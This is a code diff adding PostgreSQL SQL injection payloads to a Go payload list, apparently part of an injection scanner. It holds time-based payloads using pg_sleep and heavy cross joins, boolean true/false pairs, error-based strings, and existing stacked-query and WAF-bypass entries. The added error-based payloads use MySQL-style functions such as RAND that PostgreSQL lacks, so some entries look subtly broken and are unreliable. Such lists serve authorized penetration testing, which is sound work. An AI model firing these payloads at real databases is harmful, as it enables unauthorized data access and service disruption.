@@ -130,6 +130,43 @@ var PostgreSQL = PayloadGroup{
 		{Type: "stacked", Content: "'; CREATE OR REPLACE FUNCTION bypass() RETURNS void AS $$ BEGIN PERFORM pg_sleep(5); END; $$ LANGUAGE plpgsql; SELECT bypass();--"},
 
 		// ═══════════════════════════════════════════
+		// ADVANCED TIME-BASED
+		// ═══════════════════════════════════════════
+		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM generate_series(1,10000000) a, generate_series(1,100) b)--"},
+		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT 1)a, (SELECT 1)b, (SELECT 1)c, (SELECT 1)d, (SELECT 1)e, (SELECT 1)f, (SELECT 1)g)--"},
+		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT COUNT(*) FROM pg_class a, pg_class b, pg_class c) x)--"},
+		{Type: "time", Content: "1' AND (SELECT 1 FROM (SELECT pg_sleep(5)) a)--"},
+		{Type: "time", Content: "1' AND (SELECT * FROM (SELECT pg_sleep(5)) a)--"},
+		{Type: "time", Content: "') AND (SELECT * FROM (SELECT pg_sleep(5)) a)--"},
+		{Type: "time", Content: "1\") AND (SELECT * FROM (SELECT pg_sleep(5)) a)--"},
+		{Type: "time", Content: "1' AND pg_sleep(5) AND '1'='1"},
+		{Type: "time", Content: "1' AND pg_sleep(5) AND '%'='%"},
+		{Type: "time", Content: "1' OR pg_sleep(5)--"},
+		{Type: "time", Content: "1') OR pg_sleep(5)--"},
+		{Type: "time", Content: "1\" OR pg_sleep(5)--"},
+
+		// ADVANCED BOOLEAN
+		// ═══════════════════════════════════════════
+		{Type: "boolean", Content: "1' AND 1=1 AND '1'='1", Expected: "true"},
+		{Type: "boolean", Content: "1' AND 1=2 AND '1'='1", Expected: "false"},
+		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
+		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
+		{Type: "boolean", Content: "1' AND 1=1-- -", Expected: "true"},
+		{Type: "boolean", Content: "1' AND 1=2-- -", Expected: "false"},
+		{Type: "boolean", Content: "') AND 1=1--", Expected: "true"},
+		{Type: "boolean", Content: "') AND 1=2--", Expected: "false"},
+		{Type: "boolean", Content: "\" AND 1=1--", Expected: "true"},
+		{Type: "boolean", Content: "\" AND 1=2--", Expected: "false"},
+		{Type: "boolean", Content: "1\" AND 1=1--", Expected: "true"},
+		{Type: "boolean", Content: "1\" AND 1=2--", Expected: "false"},
+		{Type: "boolean", Content: "1') AND 1=1--", Expected: "true"},
+		{Type: "boolean", Content: "1') AND 1=2--", Expected: "false"},
+
+		// ADVANCED ERROR-BASED
+		// ═══════════════════════════════════════════
+		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,COUNT(*),CONCAT((SELECT user),':',FLOOR(RAND()*2))x FROM pg_class GROUP BY x) a)--"},
+		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,2,3,COUNT(*) FROM pg_class GROUP BY CONCAT((SELECT user),FLOOR(RAND()*2))) a)--"},
+
 		// WAF BYPASS
 		// ═══════════════════════════════════════════
 		{Type: "bypass", Content: "'/**/OR/**/1=1--"},
